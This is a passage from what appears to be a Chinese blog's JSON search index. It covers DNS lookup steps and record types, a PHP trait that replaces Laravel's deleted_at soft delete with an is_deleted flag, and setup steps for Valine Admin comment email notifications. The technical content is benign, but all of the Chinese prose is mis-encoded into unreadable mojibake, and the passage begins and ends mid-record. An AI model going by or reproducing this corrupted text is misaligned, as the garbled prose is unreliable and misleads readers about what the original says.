æœåŠ¡å™¨å‘è¿™äº›é¡¶çº§åŸŸåæœåŠ¡å™¨å‘å‡ºæŸ¥è¯¢è¯·æ±‚ï¼Œè¯¢é—® qq.com çš„ NS è®°å½•ã€‚qq.com. 172800 IN NS ns1.qq.com.qq.com. 172800 IN NS ns2.qq.com.qq.com. 172800 IN NS ns3.qq.com.qq.com. 172800 IN NS ns4.qq.com.;; Received 805 bytes from 192.48.79.30#53(j.gtld-servers.net) in 331 msè¿™é‡Œæ˜¾ç¤ºçš„æ˜¯ qq.com çš„ 4 æ¡ NS è®°å½•ï¼Œç”± j.gtld-servers.net è¿™å°æœåŠ¡å™¨æœ€å…ˆè¿”å›ã€‚ç„¶åæœ¬åœ° DNS æœåŠ¡å™¨å‘è¿™å››å°æœåŠ¡å™¨æŸ¥è¯¢ä¸‹ä¸€çº§åŸŸå news.qq.com çš„ NS è®°å½•ã€‚news.qq.com. 86400 IN NS ns-cnc1.qq.com.news.qq.com. 86400 IN NS ns-cnc2.qq.com.;; Received 180 bytes from 58.144.154.100#53(ns4.qq.com) in 37 msè¿™é‡Œæ˜¾ç¤ºçš„æ˜¯ news.qq.com çš„ NS è®°å½•ï¼Œå®ƒä»¬æ˜¯ç”±ä¸Šé¢çš„ ns4.qq.com åŸŸåæœåŠ¡å™¨è¿”å›çš„ã€‚ç„¶åæœ¬åœ° DNS æœåŠ¡å™¨å‘è¿™ä¸¤å°æœºå™¨æŸ¥è¯¢ news.qq.com çš„ä¸»æœºåã€‚news.qq.com. 600 IN CNAME https.qq.com.https.qq.com. 600 IN A 125.39.52.26;; Received 76 bytes from 223.167.83.104#53(ns-cnc2.qq.com) in 29 msè¿™æ˜¯ä¸Šé¢çš„ ns-cnc2.qq.com è¿”å›çš„æœ€ç»ˆæŸ¥è¯¢ç»“æœï¼šnews.qq.com æ˜¯ https.qq.com çš„åˆ«åï¼Œè€Œ https.qq.com çš„ A è®°å½•åœ°å€æ˜¯ 125.39.52.26 å®é™…çš„æµç¨‹é‡Œé¢ï¼Œæœ¬åœ° DNS æœåŠ¡å™¨ç›¸å½“äºé—¨å«å¤§çˆ·ï¼Œæ ¹åŸŸåæœåŠ¡å™¨ç›¸å½“äºå±€é•¿åŒå¿—ï¼Œå…¶ä½™ä»¥æ­¤ç±»æ¨ã€‚å®¢æˆ·ç«¯ä¸æœ¬åœ° DNS æœåŠ¡å™¨ä¹‹é—´çš„æŸ¥è¯¢å«é€’å½’æŸ¥è¯¢ï¼Œæœ¬åœ° DNS æœåŠ¡å™¨ä¸å…¶ä»–åŸŸåæœåŠ¡å™¨ä¹‹é—´çš„æŸ¥è¯¢å°±å«è¿­ä»£æŸ¥è¯¢ã€‚ åŸŸåè®°å½•çš„ç±»å‹åŸŸåæœåŠ¡å™¨ä¹‹æ‰€ä»¥èƒ½çŸ¥é“åŸŸåä¸ IP åœ°å€çš„æ˜ å°„ä¿¡æ¯ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬åœ¨åŸŸåæœåŠ¡å•†é‚£é‡Œæäº¤äº†åŸŸåè®°å½•ã€‚è´­ä¹°äº†ä¸€ä¸ªåŸŸåä¹‹åï¼Œæˆ‘ä»¬éœ€è¦åœ¨åŸŸåæœåŠ¡å•†é‚£é‡Œè®¾ç½®åŸŸåè§£æçš„è®°å½•ï¼ŒåŸŸåæœåŠ¡å•†æŠŠè¿™äº›è®°å½•æ¨é€åˆ°æƒå¨åŸŸåæœåŠ¡å™¨ï¼Œè¿™æ ·æˆ‘ä»¬çš„åŸŸåæ‰èƒ½æ­£å¼ç”Ÿæ•ˆã€‚ åœ¨è®¾ç½®åŸŸåè®°å½•çš„æ—¶å€™ï¼Œä¼šé‡åˆ°ã€ŒA è®°å½•ã€ã€ã€ŒCNAMEã€ ç­‰ä¸åŒç±»å‹ï¼Œè¿™æ­£æ˜¯å‰é¢åšåŸŸåè§£æçš„æ—¶å€™æˆ‘ä»¬ç¢°åˆ°çš„ç»“æœã€‚è¿™äº›ç±»å‹æ˜¯ä»€ä¹ˆæ„æ€ï¼Œå®ƒä»¬ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹å¸¸è§çš„è®°å½•ç±»å‹ã€‚ A è®°å½•ã€‚A (Address) è®°å½•ç”¨æ¥ç›´æ¥æŒ‡å®šä¸»æœºåï¼ˆæˆ–åŸŸåï¼‰å¯¹åº”çš„ IP åœ°å€ã€‚ä¸»æœºåå°±æ˜¯åŸŸåå‰ç¼€ï¼Œå¸¸è§æœ‰å¦‚ä¸‹å‡ ç§ï¼š wwwï¼šè§£æåçš„åŸŸåä¸º www.0x2beace.comï¼Œä¸€èˆ¬ç”¨äºç½‘ç«™åœ°å€ã€‚ @ï¼šç›´æ¥è§£æä¸»åŸŸåã€‚ *ï¼šæ³›è§£æï¼ŒæŒ‡å°† *.yourdomain.com è§£æåˆ°åŒä¸€ IPã€‚ CNAME è®°å½•ã€‚CNAME çš„å…¨ç§°æ˜¯ Canonical Nameï¼Œé€šå¸¸ç§°åˆ«åè®°å½•ã€‚å¦‚æœéœ€è¦å°†åŸŸåæŒ‡å‘å¦ä¸€ä¸ªåŸŸåï¼Œå†ç”±å¦ä¸€ä¸ªåŸŸåæä¾› IP åœ°å€ï¼Œå°±éœ€è¦æ·»åŠ  CNAME è®°å½•ã€‚ MX è®°å½•ã€‚é‚®ä»¶äº¤æ¢è®°å½•ï¼Œç”¨äºå°†ä»¥è¯¥åŸŸåä¸ºç»“å°¾çš„ç”µå­é‚®ä»¶æŒ‡å‘å¯¹åº”çš„é‚®ä»¶æœåŠ¡å™¨ä»¥è¿›è¡Œå¤„ç†ã€‚ NS è®°å½•ã€‚åŸŸåæœåŠ¡å™¨è®°å½•ï¼Œå¦‚æœéœ€è¦æŠŠå­åŸŸåäº¤ç»™å…¶ä»– DNS æœåŠ¡å™¨è§£æï¼Œå°±éœ€è¦æ·»åŠ  NS è®°å½•ã€‚ AAAA è®°å½•ã€‚ç”¨æ¥æŒ‡å®šä¸»æœºåï¼ˆæˆ–åŸŸåï¼‰å¯¹åº”çš„ IPv6 åœ°å€ï¼Œä¸å¸¸ç”¨ã€‚ TXT è®°å½•ã€‚å¯ä»¥å¡«å†™ä»»ä½•ä¸œè¥¿ï¼Œé•¿åº¦é™åˆ¶ 255ã€‚ç»å¤§å¤šæ•°çš„ TXT è®°å½•æ˜¯ç”¨æ¥åš SPF è®°å½•ï¼ˆååƒåœ¾é‚®ä»¶ï¼‰ï¼ŒMX è®°å½•çš„ä½œç”¨æ˜¯ç»™å¯„ä¿¡è€…æŒ‡æ˜æŸä¸ªåŸŸåçš„é‚®ä»¶æœåŠ¡å™¨æœ‰å“ªäº›ã€‚SPF çš„ä½œç”¨è·Ÿ MX ç›¸åï¼Œå®ƒå‘æ”¶ä¿¡è€…è¡¨æ˜ï¼Œå“ªäº›é‚®ä»¶æœåŠ¡å™¨æ˜¯ç»è¿‡æŸä¸ªåŸŸåè®¤å¯ä¼šå‘é€é‚®ä»¶çš„ã€‚ æ˜¾æ€§ URLã€‚ä»ä¸€ä¸ªåœ°å€ 301 é‡å®šå‘ï¼ˆä¹Ÿå«ã€Œæ°¸ä¹…æ€§è½¬ç§»ã€ï¼‰åˆ°å¦ä¸€ä¸ªåœ°å€çš„æ—¶å€™ï¼Œå°±éœ€è¦æ·»åŠ æ˜¾æ€§ URL è®°å½•ã€‚ éšæ€§ URLã€‚ä»ä¸€ä¸ªåœ°å€ 302 è·³è½¬ï¼ˆä¹Ÿå«ã€Œä¸´æ—¶è·³è½¬ã€ï¼‰åˆ°å¦ä¸€ä¸ªåœ°å€ï¼Œéœ€è¦æ·»åŠ éšæ€§ URL è®°å½•ã€‚å®ƒç±»ä¼¼äºæ˜¾æ€§ URLï¼ŒåŒºåˆ«åœ¨äºéšæ€§ URL ä¸ä¼šæ”¹å˜åœ°å€æ ä¸­çš„åŸŸåã€‚ åœ¨å¡«å†™å„ç§è®°å½•çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¿˜ä¼šç¢°åˆ°ä¸€ä¸ªç‰¹æ®Šçš„è®¾ç½®é¡¹â€”â€”TTLï¼Œç”Ÿå­˜æ—¶é—´ï¼ˆTime To Liveï¼‰ã€‚ TTLè¡¨ç¤ºè§£æè®°å½•åœ¨ DNS æœåŠ¡å™¨ä¸­çš„ç¼“å­˜æ—¶é—´ï¼Œæ—¶é—´é•¿åº¦å•ä½æ˜¯ç§’ï¼Œä¸€èˆ¬ä¸º3600ç§’ã€‚æ¯”å¦‚ï¼šåœ¨è®¿é—®news.qq.com æ—¶ï¼Œå¦‚æœåœ¨ DNS æœåŠ¡å™¨çš„ç¼“å­˜ä¸­æ²¡æœ‰è¯¥è®°å½•ï¼Œå°±ä¼šå‘æŸä¸ª NS æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œè·å¾—è¯¥è®°å½•åï¼Œè¯¥è®°å½•ä¼šåœ¨ DNS æœåŠ¡å™¨ä¸Šä¿å­˜TTLçš„æ—¶é—´é•¿åº¦ï¼Œåœ¨TTLæœ‰æ•ˆæœŸå†…è®¿é—® news.qq.comï¼ŒDNS æœåŠ¡å™¨ä¼šç›´æ¥ç¼“å­˜ä¸­è¿”å›åˆšæ‰çš„è®°å½•ã€‚ åŸæ–‡é“¾æ¥ åŸŸåèƒŒåé‚£äº›äº‹","categories":[],"tags":[{"name":"åŸŸå","slug":"åŸŸå","permalink":"https://www.0x2beace.com/tags/%E5%9F%9F%E5%90%8D/"}]},{"title":"å¦‚ä½•æ›´å¥½çš„ä½¿ç”¨ Laravel è½¯åˆ é™¤","slug":"how-to-better-use-laravel-soft-delete","date":"2021-04-10T12:26:01.000Z","updated":"2021-04-10T12:27:07.466Z","comments":true,"path":"how-to-better-use-laravel-soft-delete/","link":"","permalink":"https://www.0x2beace.com/how-to-better-use-laravel-soft-delete/","excerpt":"é€šå¸¸å¯¹äºæ•°æ®åº“ä¸­æ¯”è¾ƒé‡è¦çš„æ•°æ®ï¼Œä¸ä¼šç›´æ¥åˆ é™¤ï¼Œè€Œæ˜¯é‡‡ç”¨è½¯åˆ é™¤ã€‚","text":"é€šå¸¸å¯¹äºæ•°æ®åº“ä¸­æ¯”è¾ƒé‡è¦çš„æ•°æ®ï¼Œä¸ä¼šç›´æ¥åˆ é™¤ï¼Œè€Œæ˜¯é‡‡ç”¨è½¯åˆ é™¤ã€‚ Laravel çš„Eloquent ä¹Ÿæä¾›ç›¸åº”çš„åŠŸèƒ½è¾¾åˆ°è½¯åˆ é™¤æ¨¡å‹çš„ç›®çš„ï¼Œä¸è¿‡ä¸ªäººè§‰å¾—Laravel çš„è½¯åˆ é™¤å­˜åœ¨ä¸€äº›é—®é¢˜ï¼š Laravelä¸­ä½¿ç”¨äº†ä¸€ä¸ªæ—¥æœŸå­—æ®µä½œä¸ºæ ‡è¯†çŠ¶æ€ï¼Œdeleted_at é»˜è®¤å€¼ä¸ºNULLï¼Œå¦‚æœè®°å½•è¢«åˆ é™¤äº†ï¼Œdeleted_at çš„å€¼åˆ™ä¸ºå½“å‰æ—¶é—´æˆ³ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡is null or not is nullæŸ¥è¯¢ä¸€æ¡è®°å½•æ˜¯å¦è¢«åˆ é™¤ï¼Œè¿™ä¼šå¯¼è‡´Mysql å¼•æ“æ”¾å¼ƒä½¿ç”¨ç´¢å¼•è€Œè¿›è¡Œå…¨è¡¨æ‰«æï¼ŒæŸ¥è¯¢æ•ˆç‡å¯æƒ³è€ŒçŸ¥ã€‚ å¯ä»¥é€šè¿‡é‡å†™SoftDeletes.php ç±»æ¥ä¿®æ”¹Laravel SoftDelete çš„é€»è¾‘ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;?phpnamespace App\\Models\\Traits;use Illuminate\\Database\\Eloquent\\SoftDeletes;trait SoftDeletesEx &#123; use SoftDeletes; /** * Boot the soft deleting trait for a model. * * @return void */ public static function bootSoftDeletes() &#123; static::addGlobalScope(new SoftDeletingScopeEx()); &#125; /** * Get the name of the \"deleted at\" column. * * * @return string */ public function getDeletedAtColumn() &#123; // è‡ªå®šä¹‰æ ‡è¯†å­—æ®µ return 'is_deleted'; &#125; /** * Perform the actual delete query on this model instance. * * @return void */ protected function runSoftDelete() &#123; $query = $this-&gt;newQueryWithoutScopes()-&gt;where($this-&gt;getKeyName(), $this-&gt;getKey()); // 0. æ­£å¸¸ 1. å·²åˆ é™¤ $this-&gt;&#123;$this-&gt;getDeletedAtColumn()&#125; = $time = 1; $query-&gt;update([ $this-&gt;getDeletedAtColumn() =&gt; $time ]); &#125; /** * Restore a soft-deleted model instance. * * @return bool|null */ public function restore() &#123; // If the restoring event does not return false, we will proceed with this // restore operation. Otherwise, we bail out so the developer will stop // the restore totally. We will clear the deleted timestamp and save. if ($this-&gt;fireModelEvent('restoring') === false) &#123; return false; &#125; $this-&gt;&#123;$this-&gt;getDeletedAtColumn()&#125; = 0; // Once we have saved the model, we will fire the \"restored\" event so this // developer will do anything they need to after a restore operation is // totally finished. Then we will return the result of the save call. $this-&gt;exists = true; $result = $this-&gt;save(); $this-&gt;fireModelEvent('restored', false); return $result; &#125; /** * Determine if the model instance has been soft-deleted. * * @return bool */ public function trashed() &#123; return ! ($this-&gt;&#123;$this-&gt;getDeletedAtColumn()&#125; === 0); &#125;&#125; é€šè¿‡å®šä¹‰is_deleted å­—æ®µæ¥æ ‡ç¤ºæ˜¯å¦åˆ é™¤ï¼Œé»˜è®¤å€¼0. æœªåˆ é™¤ï¼Œ1. å·²åˆ é™¤ï¼ŒåŒæ—¶ç»™è¯¥å­—æ®µæ·»åŠ æ™®é€šç´¢å¼•ã€‚ æ¥ç€è¿˜éœ€è¦é‡å†™SoftDeletingScope.php ç±»ï¼Œçº¦æŸé»˜è®¤æŸ¥è¯¢is_deleted = 0 çš„è®°å½•ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192&lt;?phpnamespace App\\Models\\Traits;use Illuminate\\Database\\Eloquent\\Builder;use Illuminate\\Database\\Eloquent\\Model;use Illuminate\\Database\\Eloquent\\SoftDeletingScope;class SoftDeletingScopeEx extends SoftDeletingScope &#123; /** * å°†çº¦æŸåŠ åˆ° Eloquent æŸ¥è¯¢æ„é€ ä¸­ï¼Œè¿™æ ·é»˜è®¤æŸ¥è¯¢çš„å°±æ˜¯ `is_deleted` = 0 çš„è®°å½•äº† * Apply the scope to a given Eloquent query builder. * * @param \\Illuminate\\Database\\Eloquent\\Builder $builder * @param \\Illuminate\\Database\\Eloquent\\Model $model * @return void */ public function apply(Builder $builder, Model $model) &#123; $builder-&gt;where($model-&gt;getQualifiedDeletedAtColumn(), 0); &#125; /** * Extend the query builder with the needed functions. * * @param \\Illuminate\\Database\\Eloquent\\Builder $builder * @return void */ public function extend(Builder $builder) &#123; foreach ($this-&gt;extensions as $extension) &#123; $this-&gt;&#123;\"add&#123;$extension&#125;\"&#125;($builder); &#125; $builder-&gt;onDelete(function (Builder $builder) &#123; $column = $this-&gt;getDeletedAtColumn($builder); return $builder-&gt;update([ $column =&gt; \\DB::Raw('UNIX_TIMESTAMP(NOW())') ]); &#125;); &#125; /** * Add the restore extension to the builder. * * @param \\Illuminate\\Database\\Eloquent\\Builder $builder * @return void */ protected function addRestore(Builder $builder) &#123; $builder-&gt;macro('restore', function (Builder $builder) &#123; $builder-&gt;withTrashed(); return $builder-&gt;update([ $builder-&gt;getModel() -&gt;getDeletedAtColumn() =&gt; 0 ]); &#125;); &#125; /** * Add the without-trashed extension to the builder. * * @param \\Illuminate\\Database\\Eloquent\\Builder $builder * @return void */ protected function addWithoutTrashed(Builder $builder) &#123; $builder-&gt;macro('withoutTrashed', function (Builder $builder) &#123; $model = $builder-&gt;getModel(); $builder-&gt;withoutGlobalScope($this) -&gt;where($model-&gt;getQualifiedDeletedAtColumn(), 0); return $builder; &#125;); &#125; /** * Add the only-trashed extension to the builder. * * @param \\Illuminate\\Database\\Eloquent\\Builder $builder * @return void */ protected function addOnlyTrashed(Builder $builder) &#123; $builder-&gt;macro('onlyTrashed', function (Builder $builder) &#123; $model = $builder-&gt;getModel(); $builder-&gt;withoutGlobalScope($this) -&gt;where($model-&gt;getQualifiedDeletedAtColumn(), '&lt;&gt;', 0); return $builder; &#125;); &#125;&#125; æœ€ååº”ç”¨åˆ°Model ä¸­ï¼š 1234567891011121314&lt;?phpnamespace App\\Models;use Illuminate\\Database\\Eloquent\\Model;use App\\Models\\Traits\\SoftDeletesEx;class User extends Model&#123; use SoftDeletesEx; protected $table = 'user'; protected $dates = [\"is_deleted\"];&#125; å‚è€ƒé“¾æ¥ laravelæ¡†æ¶è‡ªå®šä¹‰è½¯åˆ é™¤ Laravel5è½¯åˆ é™¤ï¼ˆSoftDeletesï¼‰çš„deleted_atæ”¹é€ ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Valine å¦‚ä½•å¼€å¯è¯„è®ºé‚®ä»¶é€šçŸ¥","slug":"how-does-valine-turn-on-comment-email-notifications","date":"2021-04-05T12:22:51.000Z","updated":"2021-04-05T12:23:45.789Z","comments":true,"path":"how-does-valine-turn-on-comment-email-notifications/","link":"","permalink":"https://www.0x2beace.com/how-does-valine-turn-on-comment-email-notifications/","excerpt":"äº‹æƒ…æ˜¯è¿™æ ·çš„ï¼Œæ˜¨å¤©æ— æ„åœ¨åšå®¢ä¸Šçœ‹åˆ°ä¸€æ¡ç•™è¨€ï¼Œç•™è¨€æ—¶é—´æ˜¯ä¸¤å¤©ä¹‹å‰ï¼Œæˆ‘æ‰æ„è¯†åˆ°ç›®å‰çš„è¯„è®ºç³»ç»Ÿç¼ºå°‘é€šçŸ¥ =_=!ã€‚","text":"äº‹æƒ…æ˜¯è¿™æ ·çš„ï¼Œæ˜¨å¤©æ— æ„åœ¨åšå®¢ä¸Šçœ‹åˆ°ä¸€æ¡ç•™è¨€ï¼Œç•™è¨€æ—¶é—´æ˜¯ä¸¤å¤©ä¹‹å‰ï¼Œæˆ‘æ‰æ„è¯†åˆ°ç›®å‰çš„è¯„è®ºç³»ç»Ÿç¼ºå°‘é€šçŸ¥ =_=!ã€‚ æ²¡æœ‰é€šçŸ¥è¿™æ€ä¹ˆèƒ½è¡Œå‘¢ï¼Ÿå› ä¸ºæˆ‘ç”¨çš„æ˜¯ä¸€æ¬¾å«åšValine çš„è¯„è®ºç³»ç»Ÿï¼Œé©¬ä¸ŠGoogle äº†ä¸€ä¸‹ï¼Œäºæ˜¯æœ‰äº†è¿™ç¯‡ç¬”è®°ã€‚ æ‰€ä»¥è¿™ç¯‡ç¬”è®°çš„å†…å®¹ï¼Œå¯èƒ½ä¸é€‚ç”¨å…¶ä»–è¯„è®ºç³»ç»Ÿã€‚ Valine Admin æ˜¯ Valine è¯„è®ºç³»ç»Ÿçš„åç«¯åŠŸèƒ½è¡¥å……å’Œå¢å¼ºï¼Œä¸»è¦å®ç°è¯„è®ºé‚®ä»¶é€šçŸ¥ã€è¯„è®ºç®¡ç†ã€åƒåœ¾è¯„è®ºè¿‡æ»¤ç­‰åŠŸèƒ½ã€‚æ”¯æŒå®Œå…¨è‡ªå®šä¹‰çš„é‚®ä»¶é€šçŸ¥æ¨¡æ¿ï¼ŒåŸºäºAkismet APIå®ç°å‡†ç¡®çš„åƒåœ¾è¯„è®ºè¿‡æ»¤ã€‚ åœ¨æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œé¦–å…ˆå¾—æ³¨å†Œä¸€ä¸ªLeanCloud è´¦å·ã€‚ LeanCloud æ˜¯ä»€ä¹ˆï¼Ÿ å®ƒæ˜¯ä¸€ç«™å¼åç«¯äº‘æœåŠ¡æä¾›å•†ï¼Œåˆ°æ—¶å€™æˆ‘ä»¬çš„è¯„è®ºç³»ç»Ÿå°±æ˜¯è¦éƒ¨ç½²åœ¨è¿™ä¸ªäº‘æœåŠ¡ä¸Šã€‚ åˆ›å»ºäº‘å¼•æ“æ³¨å†ŒæˆåŠŸä¹‹åï¼Œè¿›å…¥æ§åˆ¶å°ï¼Œæ–°å»ºä¸€ä¸ªåº”ç”¨ï¼š é€‰æ‹©å¼€å‘æ¿å°±å¥½ã€‚ ç„¶åè¿›å…¥åˆšåˆ›å»ºå¥½çš„åº”ç”¨ï¼Œä¾æ¬¡ç‚¹å‡»è®¾ç½®=&gt; åº”ç”¨Keyï¼Œå¯ä»¥çœ‹åˆ°AppID å’ŒAppKeyï¼Œè¿™ä¸¤ä¸ªä¸œè¥¿å¾ˆé‡è¦ï¼Œ æ‰“å¼€åšå®¢ä¸»é¢˜çš„é…ç½®æ–‡ä»¶ï¼Œåœ¨å¯¹åº”çš„ä½ç½®åˆ†åˆ«å¡«ä¸ŠappIdå’ŒappKeyï¼š ä¸‹ä¸€æ­¥éœ€è¦ç»‘å®šåŸŸåï¼Œè¿™é‡Œéœ€è¦ç»‘å®šçš„åŸŸåï¼Œå°±æ˜¯ä½ çš„åšå®¢çš„åŸŸåï¼Œå›½å†…ç‰ˆå¯èƒ½æœ‰å¤šä¸ªåŸŸåç»‘å®šä¾›é€‰ï¼Œè¿™é‡Œé€‰æ‹©äº‘å¼•æ“å°±å¥½ã€‚ åˆ°æ—¶å€™è¿™ä¸ªåŸŸåå°±æ˜¯è¿›å…¥æˆ‘ä»¬çš„è¯„è®ºç³»ç»Ÿçš„å…¥å£ã€‚ éœ€è¦å…ˆå®ŒæˆCNAME åŸŸåè§£æï¼Œç»‘å®šæ‰ä¼šç”Ÿæ•ˆã€‚ è¿›å…¥ä½ çš„åŸŸåç®¡ç†åå°ï¼Œæ·»åŠ ä¸€æ¡CNAME è®°å½•ï¼Œä¸»æœºåç§°å°±æ˜¯åˆšæ‰ç»‘å®šçš„å­åŸŸåã€‚ åŸŸåè§£ææ²¡é‚£ä¹ˆå¿«ï¼Œç­‰å¾…çš„æ—¶é—´å¯ä»¥å¼€å§‹é…ç½®äº‘å¼•æ“ã€‚ è¿›å…¥äº‘å¼•æ“=&gt;è®¾ç½®ï¼Œæ·»åŠ äº‘å¼•æ“ç¯å¢ƒå˜é‡ï¼š å˜é‡ ç¤ºä¾‹ è¯´æ˜ SITE_NAME Booâ€™s Blog [å¿…å¡«]åšå®¢åç§° SITE_URL https://0x2beace.com [å¿…å¡«]é¦–é¡µåœ°å€ SMTP_SERVICE QQ [æ–°ç‰ˆæ”¯æŒ]é‚®ä»¶æœåŠ¡æä¾›å•†ï¼Œæ”¯æŒ QQã€163ã€126ã€Gmail ä»¥åŠ æ›´å¤š SMTP_USER xxxxxx@qq.com [å¿…å¡«]SMTPç™»å½•ç”¨æˆ· SMTP_PASS ccxxxxxxxxch [å¿…å¡«]SMTPç™»å½•å¯†ç  SENDER_NAME Boo [å¿…å¡«]å‘ä»¶äºº SENDER_EMAIL xxxxxx@qq.com [å¿…å¡«]å‘ä»¶é‚®ç®± ADMIN_URL https://xxx.0x2beace.com/ [å»ºè®®]Webä¸»æœºäºŒçº§åŸŸåï¼ˆäº‘å¼•æ“åŸŸåï¼‰ï¼Œç”¨äºè‡ªåŠ¨å”¤é†’ BLOGGER_EMAIL xxxxx@gmail.com [å¯é€‰]åšä¸»é€šçŸ¥æ”¶ä»¶åœ°å€ï¼Œé»˜è®¤ä½¿ç”¨SENDER_EMAIL AKISMET_KEY xxxxxxxx [å¯é€‰]Akismet Key ç”¨äºåƒåœ¾è¯„è®ºæ£€æµ‹ï¼Œè®¾ä¸ºMANUAL_REVIEWå¼€å¯äººå·¥å®¡æ ¸ï¼Œç•™ç©ºä¸ä½¿ç”¨ååƒåœ¾ ç‚¹å‡»ä¿å­˜ä¹‹åï¼Œåˆ‡æ¢åˆ°äº‘å¼•æ“=&gt;éƒ¨ç½²ï¼Œéƒ¨ç½²æ¨¡å¼é€‰æ‹©éƒ¨ç½²é¡¹ç›®-Gitéƒ¨ç½²ï¼Œåˆ†æ”¯masterï¼Œæ‰‹åŠ¨éƒ¨ç½²ç›®æ ‡ç¯å¢ƒä¸ºç”Ÿäº§ç¯å¢ƒï¼ŒGit ä»“åº“å¡«å…¥ï¼šhttps://github.com/DesertsP/Valine-Admin.gitï¼Œç‚¹å‡»éƒ¨ç½²å³å¯ã€‚ è¯„è®ºç®¡ç†æ³¨å†Œç®¡ç†å‘˜å¦‚æœè¿™æ—¶åŸŸåè§£æå·²ç»å®Œæˆï¼Œé‚£ä¹ˆè®¿é—®ï¼šhttps://äº‘å¼•æ“åŸŸå/ï¼Œåº”è¯¥å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ç•Œé¢ï¼š è¿™æ˜¯è¿˜æ²¡æœ‰ç®¡ç†å‘˜è´¦å·ï¼Œéœ€è¦å…ˆé€šè¿‡https://äº‘å¼•æ“åŸŸå/sign-up/æ³¨å†Œä¸€ä¸ªã€‚ è‡³æ­¤å°±å·²ç»å¯ä»¥ç®¡ç†æˆ‘ä»¬çš„è¯„è®ºäº†ï¼Œä½†æ˜¯ç›®å‰è¿˜æ²¡æœ‰é‚®ä»¶é€šçŸ¥ã€‚ è®¾ç½®å®šæ—¶ä»»åŠ¡è¿™é‡Œè®¾ç½®å®šæ—¶ä»»åŠ¡çš„ç›®çš„å°±æ˜¯ï¼Œæ¯å¤©å®šæ—¶æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¼å‘çš„é‚®ä»¶ã€‚ è¿›å…¥äº‘å¼•æ“=&gt; å®šæ—¶ä»»åŠ¡ï¼Œåˆ›å»ºä¸¤ä¸ªå®šæ—¶ä»»åŠ¡ï¼š é€‰æ‹©self-wakeäº‘å‡½æ•°ï¼ŒCronè¡¨è¾¾å¼ä¸º0 */30 0-16 * * ?ï¼Œè¡¨ç¤ºæ¯å¤©æ—©0ç‚¹åˆ°æ™š16ç‚¹æ¯éš”30åˆ†é’Ÿè®¿é—®äº‘å¼•æ“ã€‚ é€‰æ‹©resend-mailsäº‘å‡½æ•°ï¼ŒCronè¡¨è¾¾å¼ä¸º0 0 0 * * ?ï¼Œè¡¨ç¤ºæ¯å¤©0ç‚¹æ£€æŸ¥è¿‡å»24å°æ—¶å†…æ¼å‘çš„é€šçŸ¥é‚®ä»¶å¹¶è¡¥å‘ã€‚ é‚®ä»¶é€šçŸ¥æ¨¡ç‰ˆ(å¯é€‰é…ç½®)é‚®ä»¶é€šçŸ¥æ¨¡æ¿åœ¨äº‘å¼•æ“ç¯å¢ƒå˜é‡ä¸­è®¾å®šï¼Œå¯è‡ªå®šä¹‰é€šçŸ¥é‚®ä»¶æ ‡é¢˜åŠå†…å®¹æ¨¡æ¿ã€‚ ç¯å¢ƒå˜é‡ ç¤ºä¾‹ è¯´æ˜ MAIL_SUBJECT ${PARENT_NICK}ï¼Œæ‚¨åœ¨${SITE_NAME}ä¸Šçš„è¯„è®ºæ”¶åˆ°äº†å›å¤ [å¯é€‰]@é€šçŸ¥é‚®ä»¶ä¸»é¢˜ï¼ˆæ ‡é¢˜ï¼‰æ¨¡æ¿ MAIL_TEMPLATE è§ä¸‹æ–‡ [å¯é€‰]@é€šçŸ¥é‚®ä»¶å†…å®¹æ¨¡æ¿ MAIL_SUBJECT_ADMIN ${SITE_NAME}ä¸Šæœ‰æ–°è¯„è®ºäº† [å¯é€‰]åšä¸»é‚®ä»¶é€šçŸ¥ä¸»é¢˜æ¨¡æ¿ MAIL_TEMPLATE_ADMIN è§ä¸‹æ–‡ [å¯é€‰]åšä¸»é‚®ä»¶é€šçŸ¥å†…å®¹æ¨¡æ¿ é‚®ä»¶é€šçŸ¥åŒ…å«ä¸¤ç§ï¼Œåˆ†åˆ«æ˜¯è¢«@é€šçŸ¥å’Œåšä¸»é€šçŸ¥ï¼Œè¿™ä¸¤ç§æ¨¡æ¿éƒ½å¯ä»¥å®Œå…¨è‡ªå®šä¹‰ã€‚é»˜è®¤ä½¿ç”¨ç»å…¸çš„è“è‰²é£æ ¼æ¨¡æ¿ï¼ˆæ ·å¼æ¥æºæœªçŸ¥ï¼‰ã€‚ é»˜è®¤è¢«@é€šçŸ¥é‚®ä»¶å†…å®¹æ¨¡æ¿å¦‚ä¸‹ï¼š 1&lt;div style&#x3D;&quot;border-top:2px solid #12ADDB;box-shadow:0 1px 3px #AAAAAA;line-height:180%;padding:0 15px 12px;margin:50px auto;font-size:12px;&quot;&gt;&lt;h2 style&#x3D;&quot;border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:13px 0 10px 8px;&quot;&gt;æ‚¨åœ¨&lt;a style&#x3D;&quot;text-decoration:none;color: #12ADDB;&quot; href&#x3D;&quot;$&#123;SITE_URL&#125;&quot; target&#x3D;&quot;_blank&quot;&gt; $&#123;SITE_NAME&#125;&lt;&#x2F;a&gt;ä¸Šçš„è¯„è®ºæœ‰äº†æ–°çš„å›å¤&lt;&#x2F;h2&gt; $&#123;PARENT_NICK&#125; åŒå­¦ï¼Œæ‚¨æ›¾å‘è¡¨è¯„è®ºï¼š&lt;div style&#x3D;&quot;padding:0 12px 0 12px;margin-top:18px&quot;&gt;&lt;div style&#x3D;&quot;background-color: #f5f5f5;padding: 10px 15px;margin:18px 0;word-wrap:break-word;&quot;&gt; 